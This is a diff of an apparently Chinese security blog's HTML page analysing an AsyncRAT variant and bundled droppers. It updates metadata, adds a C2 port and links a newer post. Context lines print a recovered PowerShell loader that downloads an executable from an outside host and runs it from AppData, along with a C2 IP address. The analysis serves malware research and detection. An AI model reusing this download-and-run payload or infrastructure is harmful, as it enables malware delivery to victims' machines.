@@ -106,7 +106,7 @@
 <meta property="og:image" content="https://s2.loli.net/2022/06/03/WFuYhmEXS6R3vNK.png">
 <meta property="og:image" content="https://s2.loli.net/2022/06/03/Rarn4meEq2ijXQd.png">
 <meta property="og:image" content="https://s2.loli.net/2022/06/03/j3qwouR2aMcPmgd.png">
-<meta property="og:updated_time" content="2022-06-03T12:49:39.795Z">
+<meta property="og:updated_time" content="2022-06-06T06:15:02.596Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="随手分析">
 <meta name="twitter:description" content="随手分析今天和往常一样我打开github随便浏览了一下新项目 浏览的过程中我看到timwhitez大佬关注了个项目  https://github.com/MerlynXS/Pegasus-Pantheon-HVNC-V2-VNC-Hidden-Browser-Remote-Administration-Rat 是之前网上售卖的一款rat工具然后我就顺便点了一下这个的主页发现他上传了许多了的rat">
@@ -392,7 +392,7 @@
 <p>这个也是一个.net pe这次是rat主体</p>
 <p><img src="https://s2.loli.net/2022/06/03/WFuYhmEXS6R3vNK.png" alt="image-20220603174520849"></p>
 <p>手动反混淆后经过分析发现是asyncrat变种并没有什么屌用</p>
-<p>C2：217.64.31.3:8808</p>
+<p>C2：217.64.31.3:8808，8437</p>
 <p>前面释放的那个Bbxodsfpqzzzzzzzzzzzzzzzz.exe文件也是用Celesty File Binder捆绑器生成的里面包含两个.NET PE文件</p>
 <p>其中SOFTINCA CRYPT.EXE是执行powershell</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Sleep</span> -Seconds <span class="number">40</span>;(<span class="built_in">New-Object</span> SystemNetWebClient)DownloadFile(<span class="string">'https://filebin2awsatsigncloud/93i3on1d3fta8ijh/dc_cryptexe'</span>,(<span class="built_in">Join-Path</span> -Path <span class="variable">$env:AppData</span> -ChildPath <span class="string">'WindowsSecurtyexe'</span>)); </span><br><span class="line"><span class="built_in">Start-Process</span> -FilePath (<span class="built_in">Join-Path</span> -Path <span class="variable">$env:AppData</span> -ChildPath <span class="string">'WindowsSecurtyexe'</span>)</span><br></pre></td></tr></table></figure>
@@ -447,6 +447,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/07/03/随手分析MyQQ-MyQQA-MyQQG供应链投毒/" rel="prev" title="随手分析MyQQ MyQQA MyQQG供应链投毒">
+                随手分析MyQQ MyQQA MyQQG供应链投毒 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -525,7 +529,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
